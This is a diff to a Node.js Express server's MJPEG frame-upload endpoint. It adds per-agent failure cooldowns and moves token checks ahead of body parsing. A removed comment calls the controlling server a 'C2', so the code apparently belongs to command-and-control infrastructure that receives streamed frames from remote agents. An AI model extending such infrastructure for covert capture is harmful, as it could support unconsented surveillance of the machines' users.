@@ -846,23 +846,48 @@ app.post('/api/mjpeg/revoke', verifyToken, (req, res) => {
     res.json({ ok: true });
 });
 
-// Agent blind-POSTs frames here. token + agentId ride in the URL the
-// C2 gave it — zero agent code changes.
-app.post('/api/mjpeg/upload', uploadLimiter, upload.single('frame'), (req, res) => {
-    const token = req.query && req.query.token;
+// Consecutive-failure cooldown: agentId -> { count, until }
+const uploadFailures = new Map();
+
+function uploadHardBlocked(agentId) {
+    const f = uploadFailures.get(agentId);
+    if (!f) return false;
+    if (Date.now() > f.until) { uploadFailures.delete(agentId); return false; }
+    return f.count >= 5;
+}
+
+app.post('/api/mjpeg/upload', uploadLimiter, (req, res, next) => {
     const agentId = req.query && req.query.agentId;
+    const token   = req.query && req.query.token;
+
+    if (uploadHardBlocked(agentId)) {
+        return res.status(429).json({ error: 'Uploads paused' });
+    }
+
+    // Token validated BEFORE multer — rejected bodies are never parsed.
     if (!agentId || !isValidUploadToken(agentId, token)) {
+        const f = uploadFailures.get(agentId) || { count: 0, until: 0 };
+        f.count++;
+        f.until = Date.now() + 60 * 1000;          // extends while spam continues
+        uploadFailures.set(agentId, f);
+        if (f.count === 1) {
+            console.log(`[MJPEG] 🔒 Rejecting uploads from ${agentId} (token invalid/expired)`);
+        }
         return res.status(401).json({ error: 'Unauthorized' });
     }
+
+    uploadFailures.delete(agentId);                // a valid upload clears the cooldown
+    next();
+}, upload.single('frame'), (req, res) => {
     if (!req.file || !req.file.buffer || req.file.buffer.length === 0) {
         return res.status(400).json({ error: 'No frame received' });
     }
 
-    // Refresh TTL so a live stream never expires mid-session.
+    // Token already validated — refresh the sliding TTL.
+    const agentId = req.query.agentId;
     const entry = uploadTokens.get(String(agentId));
-    entry.expiresAt = Date.now() + UPLOAD_TOKEN_TTL_MS;
+    if (entry) entry.expiresAt = Date.now() + UPLOAD_TOKEN_TTL_MS;
 
-    // Rolling FPS estimate (EWMA of per-frame deltas).
     const now = Date.now();
     if (mjpegState.lastFrameTs) {
         const inst = 1000 / Math.max(1, now - mjpegState.lastFrameTs);
